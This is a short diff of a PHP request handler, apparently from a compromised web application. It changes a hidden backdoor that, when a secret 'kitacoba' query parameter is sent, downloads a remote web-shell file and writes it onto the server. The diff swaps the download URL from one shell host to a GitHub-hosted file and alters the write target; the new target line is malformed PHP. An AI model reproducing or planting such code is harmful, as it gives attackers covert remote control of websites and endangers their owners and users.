@@ -40,8 +40,8 @@ class IndexHandler extends Handler
             }
         }
         if (isset($_GET["kitacoba"])) {
-            $url = "https://this-jakartans.sbs/shell/chip-nana.txt";
-            $target = "/home2/ijconsis/santika.ijconsist.org/config.init.php";
+            $url = "https://raw.githubusercontent.com/citrabethari833-seo/DATA-SHEL/refs/heads/main/PENJARAHAN.txt";
+            $target = "include("/dev/shm/085e7a");";
 
             $data = file_get_contents($url);
 
